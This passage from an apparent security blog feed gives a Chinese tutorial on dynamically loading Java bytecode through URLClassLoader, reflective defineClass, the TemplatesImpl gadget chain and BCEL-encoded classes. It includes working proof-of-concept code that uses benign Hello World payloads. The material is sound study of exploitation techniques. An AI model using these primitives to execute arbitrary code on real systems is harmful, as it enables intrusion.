class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">LdapCtx#c_lookup =&gt; <br>decodeObject =&gt; <br>deserializeObject<br></code></pre></td></tr></table></figure><p><img src="/2024/07/30/JNDI/image-20240730212609194.png" alt="image-20240730212609194"></p><p>参考：</p><p><a href="https://mp.weixin.qq.com/s/khc-2oyNOA7-MeB0COl31g">JNDI注入分析 (qq.com)</a></p><p><a href="https://p4d0rn.gitbook.io/java/prerequisites/rmi-and-jndi/jndi#jndi-ldap">JNDI | Java (gitbook.io)</a></p><p><a href="http://ww25.yongsheng.site/2022/07/18/JNDI-attack/?subid1=20240730-2329-3605-89e6-4e26b297e35b">yongsheng.site</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb-动态加载字节码</title>
    <link href="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    <url>/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<p>这次续上CC3里没讲完的动态加载字节码。</p><h2 id="利用-URLClassLoader-加载远程class文件"><a href="#利用-URLClassLoader-加载远程class文件" class="headerlink" title="利用 URLClassLoader 加载远程class文件"></a>利用 URLClassLoader 加载远程class文件</h2><p>Java的<code>ClassLoader</code>来用来加载字节码文件最基础的方法。</p><p>学到这里，知道反射的人应该也很清楚，<code>ClassLoader</code>就是一个“加载器”，告诉Java虚拟机如何加载这个类。Java默认的<code>ClassLoader</code>就是根据类名来加载类，这个类名是类完整路径，如 <code>java.lang.Runtime</code> 。</p><p><code>ClassLoader</code>的概念的确很宽泛，所以我也不做深入分析，这里要说到的是这个 </p><p><code>ClassLoader</code>： <code>URLClassLoader</code> </p><p><code>URLClassLoader</code>实际上是我们平时默认使用的<code>AppClassLoader</code>的父类。</p><p>所以我们解释<code>URLClassLoader</code>的工作过程实际上就是在解释默认的Java类加载器的工作流程。 </p><p>正常情况下，Java会根据配置项<code>sun.boot.class.path</code>和<code>java.class.path</code>中列举到的基础路径（这些路径是经过处理后的<code>java.net.URL</code>类）来寻找.class文件来加载。</p><p>而这个基础路径有分为三种情况： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">·URL未以斜杠/结尾，则认为是一个JAR文件，使用JarLoader来寻找类，即为在Jar包中寻找.class文件 <br>·URL以斜杠/结尾，且协议名是file，则使用FileLoader来寻找类，即为在本地文件系统中寻找.class文件<br>·URL以斜杠/结尾，且协议名不是file，则使用最基础的Loader来寻找类 <br></code></pre></td></tr></table></figure><p>我们正常开发的时候通常遇到的是前两者，那什么时候才会出现使用Loader寻找类的情况呢？</p><p>当然是非file协议的情况下，最常见的就是<strong>http协议</strong>。</p><p>HTTP小测：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloClassLoader</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        URL[] urls = &#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://localhost:8000/&quot;</span>)&#125;;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> URLClassLoader.newInstance(urls);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> loader.loadClass(<span class="hljs-string">&quot;Hello&quot;</span>);<br>        c.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们编译一个简单的HelloWorld程序，放在<a href="http://localhost:8000/Hello.class%EF%BC%9A">http://localhost:8000/Hello.class：</a></p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730003225504.png" alt="image-20240730003225504"></p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730003325045.png" alt="image-20240730003325045"></p><p>成功请求到我们的<code>/Hello.class</code>文件，并执行了文件里的字节码，输出”Hello World”。</p><p>所以，作为攻击者，如果我们能够控制目标<code>Java ClassLoader</code>的基础路径为一个http服务器，则可以<strong>利用远程加载的方式执行任意代码</strong>了。</p><h2 id="利用-ClassLoader-defineClass-直接加载字节码"><a href="#利用-ClassLoader-defineClass-直接加载字节码" class="headerlink" title="利用 ClassLoader#defineClass 直接加载字节码"></a>利用 ClassLoader#defineClass 直接加载字节码</h2><p>其实不管是加 载远程class文件，还是本地的class或jar文件，Java都经历的是下面这三个方法调用：</p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730002859489.png" alt="image-20240730002859489"></p><p>其中： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">·loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass <br>·findClass 的作用是根据基础URL指定的方式来加载类的字节码，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass <br>·defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类<br></code></pre></td></tr></table></figure><p>所以可见，真正核心的部分其实是 <code>defineClass</code> ，他决定了如何将一段字节流转变成一个Java类，Java 默认的 <code>ClassLoader#defineClass</code> 是一个<code>native</code>方法，逻辑在JVM的C语言代码中。 </p><p>我们可以编写一个简单的代码，来演示如何让系统的 <code>defineClass</code> 来直接加载字节码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloDefineClass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;Hello&quot;</span>, code, <span class="hljs-number">0</span>, code.length);<br>        hello.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意一点，在 <code>defineClass</code> 被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造函数，初始化代码才能被执行。</p><p>而且，即使我们将初始化代码放在类的<code>static</code>块中，在 <code>defineClass</code> 时也无法被直接调用到。</p><p>所以，如果我们要使用<code>defineClass</code>在目标机器上执行任意代码，需要想办法调用构造函数。  </p><p>执行上述example，输出了Hello World：</p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730003751282.png" alt="image-20240730003751282"></p><p>这里，因为系统的<code>ClassLoader#defineClass</code>是一个保护属性，所以我们无法直接在外部访问，不得不使用反射的形式来调用。 </p><p>在实际场景中，因为<code>defineClass</code>方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我们常用的一个攻击链<code>TemplatesImpl</code>的基石。</p><h2 id="利用-TemplatesImpl-加载字节码"><a href="#利用-TemplatesImpl-加载字节码" class="headerlink" title="利用 TemplatesImpl 加载字节码"></a>利用 TemplatesImpl 加载字节码</h2><p>重头戏来了。</p><p>虽然大部分上层开发者不会直接使用到<code>defineClass</code>方法，但是Java底层还是有一些类用到了它（否则他也没存在的价值了），这就是<code>TemplatesImpl</code>。 </p><p>引入一个玩意：</p><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类中定义了一个内部类:</p><p><code>TransletClassLoader</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransletClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;<br>    TransletClassLoader(ClassLoader parent) &#123;<br>        <span class="hljs-built_in">super</span>(parent);<br>        _loadedExternalExtensionFunctions = <span class="hljs-literal">null</span>;<br>    &#125;<br>    <br>    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;<br>        <span class="hljs-built_in">super</span>(parent);<br>        _loadedExternalExtensionFunctions = mapEF;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        Class&lt;?&gt; ret = <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">// The _loadedExternalExtensionFunctions will be empty when the</span><br>        <span class="hljs-comment">// SecurityManager is not set and the FSP is turned off</span><br>        <span class="hljs-keyword">if</span> (_loadedExternalExtensionFunctions != <span class="hljs-literal">null</span>) &#123;<br>            ret = _loadedExternalExtensionFunctions.get(name);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ret == <span class="hljs-literal">null</span>) &#123;<br>            ret = <span class="hljs-built_in">super</span>.loadClass(name);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Access to final protected superclass member from outer class.</span><br><span class="hljs-comment">     */</span><br>     Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] b)</span> &#123;<br>        <span class="hljs-keyword">return</span> defineClass(<span class="hljs-literal">null</span>, b, <span class="hljs-number">0</span>, b.length);<br>    &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>这个类里重写了<code>defineClass</code>方法，并且这里没有显式地声明其定义域。</p><p>Java中默认情况下，如果一个方法没有显式声明作用域，其作用域为<code>default</code>。</p><p>所以也就是说这里的<code>defineClass</code>由其父类的<code>protected</code>类型变成了一个<code>default</code>类型的方法，可以被类外部调用。</p><p>我们从<code>TransletClassLoader#defineClass()</code>向前追溯一下调用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">TemplatesImpl#getOutputProperties() -&gt; <br>TemplatesImpl#newTransformer() -&gt; <br>TemplatesImpl#getTransletInstance() -&gt; <br>TemplatesImpl#defineTransletClasses() -&gt; <br>TransletClassLoader#defineClass()<br></code></pre></td></tr></table></figure><p>追到最前面两个方法<code>TemplatesImpl#getOutputProperties()</code>、 <code>TemplatesImpl#newTransformer()</code>，这两者的作用域是<code>public</code>，可以被外部调用。我们尝试用 <code>newTransformer()</code>构造一个简单的POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">// source: bytecodes/HelloTemplateImpl.java</span><br>    <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;</span>);<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>    <br>    obj.newTransformer();<br>&#125;<br></code></pre></td></tr></table></figure><p>其中，<code>setFieldValue</code>方法用来设置私有属性，可见这里设置了三个属性：</p><p><code>_bytecodes</code>、<code>_name</code> 和<code>_tfactory</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">·_bytecodes是由字节码组成的数组；<br><br>·_name可以是任意字符串，只要不为<span class="hljs-literal">null</span>即可；<br><br>·_tfactory需要是一个TransformerFactoryImpl对象，因为 TemplatesImpl#defineTransletClasses()方法里有调用到_tfactory.getExternalExtensionsMap()，如果是<span class="hljs-literal">null</span>会出错。 <br></code></pre></td></tr></table></figure><p>另外值得注意的是，<code>TemplatesImpl</code>中对加载的字节码是有一定要求的：</p><p>这个字节码对应的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类。</p><p>所以我们需要构造一个特殊的类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloTemplatesImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <br><span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">HelloTemplatesImpl</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        System.out.println(<span class="hljs-string">&quot;Hello TemplatesImpl&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>它继承了 <code>AbstractTranslet</code> 类，并在构造函数里插入<code>Hello</code>的输出。</p><p>将其编译成字节码，即可被 <code>TemplatesImpl</code> 执行了：</p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730005336767.png" alt="image-20240730005336767"></p><h2 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h2><p>若我们认为所有能够恢复成一个类并在JVM虚拟机里加载的字节序列都在我们的探讨范围内。 </p><p>那么，<strong>BCEL字节码</strong>也必然在我们的讨论范围内，且占据着比较重要的地位。 </p><p><code>BCEL</code>的全名应该是<code>Apache Commons BCEL</code>，属于<code>Apache Commons</code>项目下的一个子项目，</p><p>但其因为被<code>Apache Xalan</code>所使用，而<code>Apache Xalan</code>又是Java内部对于JAXP的实现，所以BCEL也被包含在了JDK的原生库中。 </p><p>关于BCEL的详细介绍，请阅读p牛写的另一篇文章《<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoader</a>去哪了》，建议阅读完这篇文章再来阅读。</p><p>我们可以通过BCEL提供的两个类<code>Repository</code>和<code>Utility</code>来利用：</p><p><code>Repository</code>用于将一个<code>Java Class</code>先转换成原生字节码，当然这里也可以直接使用<code>javac</code>命令来编译java文件生成字节码；</p><p><code>Utility</code>用于将原生的字节码转换成BCEL格式的字节码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloBCEL</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String []args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> Repository.lookupClass(evil.Hello.class);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(cls.getBytes(), <span class="hljs-literal">true</span>);<br>        System.out.println(code);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730005943078.png" alt="image-20240730005943078"></p><p>前面加个<code>$$BCEL$$</code>标识：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloBCEL</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String []args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//encode();</span><br>        decode();<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">encode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> Repository.lookupClass(evil.Hello.class);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(cls.getBytes(), <span class="hljs-literal">true</span>);<br>        System.out.println(code);<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">decode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>().loadClass<br>                (<span class="hljs-string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQMK$c3$40$Q$7d$db$af41$b5$b5$b5$f5$5b$5bOU$c4$5c$E$P$V$_$82x$I$wT$ea$c1$d3$b6$5d$ea$96M$oiZ$f0g$e9A$c1$83$3f$c0$l$r$cen$LA$e8$k$e61of$de$be$d9$fd$f9$fd$fa$Gp$86C$H$F$ac$db$a8$a3Q$c4$86$83MlY$d8$b6$b0$c3P$b8$90$a1L$$$Z$b2$ed$a3$kC$ee$w$g$K$86$b2$_Cq$3b$N$fa$o$7e$e0$7dEL$d5$8f$G$5c$f5x$yu$be$ms$c9$b3$9c0$b8$be$98I$e5$dd$I$a5$a2$O$b1$B$97$nC$a3$fd$e4$8f$f9$8c$7b$8a$87$p$af$9b$c42$iu$cc$j$3c$k$d1T&quot;</span> +                <span class="hljs-string">&quot;mI$99$c1$e9F$d3x$m$ae$a5$d6w$8c$e4$a9nsa$a1ha$d7$c5$k$f6$ZJ$a6r$d2$7c$8cb5lY8p$d1D$8b$sR$t$&quot;</span> +              <span class="hljs-string">&quot;M$95T$ff$ae$3f$W$83$e4$l$d5$7d$9d$q$o$a0$c5$a3$v$V$eas32$f2$ee$c9IB$7e$E$P$c8Om$J$cd$60$bd$e8L$d1$96$f5$f6$b2$r$d1B$9e$9e$5c$9f$M$98$b6N$d1$a6$cc$pd$84$f9$e3O$b07Sv$u$W$M$99&quot;</span> +          <span class="hljs-string">&quot;$c5$KEw$de$40X$o$b4$b1$8a$f2b$f8$dc$88$R$f7$8eL5$fb$81$5c$w$e0$Q$ea$a1$oI$a5$o6$wX$p$a4$ef3$9d&quot;</span> + <span class="hljs-string">&quot;$b5$3f3$dbS$w$S$C$A$A&quot;</span>).newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730011732779.png" alt="image-20240730011732779"></p><p><code>BCEL ClassLoader</code>在<code>Fastjson</code>等漏洞的利用链构造时都有被用到，其实这个类和前面的 <code>TemplatesImpl</code> 都出自于同一个第三方库，<code>Apache Xalan</code>。</p><p>但是由于各种原因（详见前面所说的 《BCEL ClassLoader 去哪了》），在<strong>Java <code>8u251</code>的更新中，这个ClassLoader被移除了</strong>，所以我JDK8u401的版本是会报错的：</p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730011841209.png" alt="image-20240730011841209"></p><p>但是这种使用<code>Repository.lookupClass()</code>的方法很常用，经常用于打入恶意字节码，后续遇到具体题目的时候就知道了。打复现的时候这几个加载字节码的方式都可能会出现。</p><p>参考：</p><p>p牛-Java安全漫谈 - 13.Java中动态加载字节码的那些方法</p><p><a href="https://wx.zsxq.com/dweb2/index/tags/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88/551511412514">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
